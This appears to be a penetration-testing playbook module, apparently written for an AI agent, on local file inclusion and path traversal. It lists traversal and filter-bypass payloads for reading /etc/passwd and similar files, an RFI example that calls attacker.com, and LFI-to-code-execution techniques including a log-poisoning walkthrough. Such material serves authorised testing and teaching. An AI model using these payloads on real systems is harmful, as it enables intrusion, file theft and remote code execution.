# Web And API Operations: Attack Primitives: Traditional Web Vulnerabilities: Local File Inclusion / Path Traversal

> Apply [../module-continuity.md](../module-continuity.md). Keep the same engagement and parent path as the calling route. Load this scene only when current evidence supports its prerequisites.

### Local File Inclusion / Path Traversal

#### LFI vs Path Traversal vs RFI

- **Path traversal** (`../etc/passwd`): Reading arbitrary files by traversing directory structure. The simplest and most common.
- **LFI** (`../../../var/www/html/shell.php`): Including and executing local files through PHP `include()`/`require()` or equivalent. 
- **RFI** (`http://attacker.com/shell.txt`): Including remote files — rare in modern configs (`allow_url_include=Off` by default since PHP 5.2+).

#### Path Traversal Bypass Techniques

```
Basic: ../../../etc/passwd
Filter removes "../": ....//....//....//etc/passwd
Filter removes "../" recursively: ..././..././..././etc/passwd
Absolute path: /etc/passwd (or C:\Windows\win.ini on Windows)
URL encoding: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
Double URL: %252e%252e%252f (when decoded twice by different layers)
Unicode: ..%c0%af..%c0%af..%c0%afetc/passwd
Null byte: ../../../etc/passwd%00.jpg (PHP < 5.3.4, dangerous in file uploads)
Windows alt: ..\..\..\windows\win.ini, ....\....\....\windows\win.ini
```

#### LFI-to-RCE Techniques

When you have LFI but need code execution:

| Technique | Method | Requirements |
|---|---|---|
| **Log poisoning** | Inject server-executable code (e.g., `<?php <controlled-command>; ?>`) into a request header that appears in access logs (User-Agent, Referer) → include the log file path | Read access to log files; verify the log file path (Apache: `/var/log/apache2/access.log`, nginx: `/var/log/nginx/access.log`, or distribution-specific) |
| **Session poisoning** | Manipulate a session value you control (e.g., username field during registration) to contain server-executable code → include the session file | Know session storage path (`/tmp/sess_<id>`, `/var/lib/php/sessions/sess_<id>`), control at least one session value |
| **php://input** | POST server-executable code as the raw request body → include `php://input` to execute it | `allow_url_include=On` (disabled by default since PHP 5.2) |
| **php://filter chain** | Use `php://filter/convert.base64-encode/resource=` to build a full RCE payload from filter chains | PHP filter chains technique (synacktiv tool) |
| **/proc/self/environ** | Inject payload via User-Agent → include `/proc/self/environ` | Apache with CGI/FastCGI, non-PHP |
| **Email inclusion** | Send an email containing server-executable code to a local user → include the mail spool file (`/var/mail/<user>`, `/var/spool/mail/<user>`) | Local mail service (sendmail, postfix), known mail spool path |
| **Upload + include** | Upload a file containing server-executable code (even with a benign extension like .jpg if the file content is not validated) → include it via the LFI path | Upload function exists; uploaded file path is known or discoverable |

**Log poisoning walkthrough**:

1. Send a request with server-executable code in a logged header (User-Agent or Referer). The code should accept a command parameter (e.g., GET/POST parameter or header) and execute a controlled system command.
2. Verify the log file is reachable through the LFI primitive: include the log path and confirm the injected header text appears in the response — this confirms log poisoning is viable before escalation.
3. If the log is readable but code does not execute, check: file permissions on the log file, whether the log parser strips angle brackets or quotes, whether PHP short tags are required (`<?=` vs `<?php`).
4. Log paths vary by distribution — test Apache (`/var/log/apache2/access.log`, `/var/log/httpd/access.log`), nginx (`/var/log/nginx/access.log`), `/proc/self/fd/2` (stderr), and `/proc/self/fd/1` (stdout).
5. Failure to read the log file does not mean the vulnerability is absent — try alternative inclusion sources (session files, `/proc/self/environ`, email spool, uploaded files).

---


## Scene Exit

Return result classification, evidence, changed assumptions, affected paths, persistent changes, and the next parent-path decision.
